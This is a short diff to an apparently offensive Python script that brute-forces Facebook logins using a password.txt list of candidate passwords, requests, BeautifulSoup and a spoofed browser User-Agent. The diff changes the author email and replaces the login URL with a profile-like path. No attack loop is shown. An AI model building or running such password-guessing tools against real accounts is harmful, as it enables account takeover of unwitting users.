@@ -1,5 +1,5 @@
 # Author-Kingslayer
-# Email-kingslayer8509@gmail.com
+# Email-badang.strawfol
 # you need to create a file password.txt which contains all possible passwords
 import requests
 from bs4 import BeautifulSoup
@@ -15,7 +15,7 @@ if sys.version_info[0] != 3:
     )
     sys.exit()
 
-post_url = "https://www.facebook.com/login.php"
+post_url = "https://www.facebook.com/badang.strawfol"
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
 }
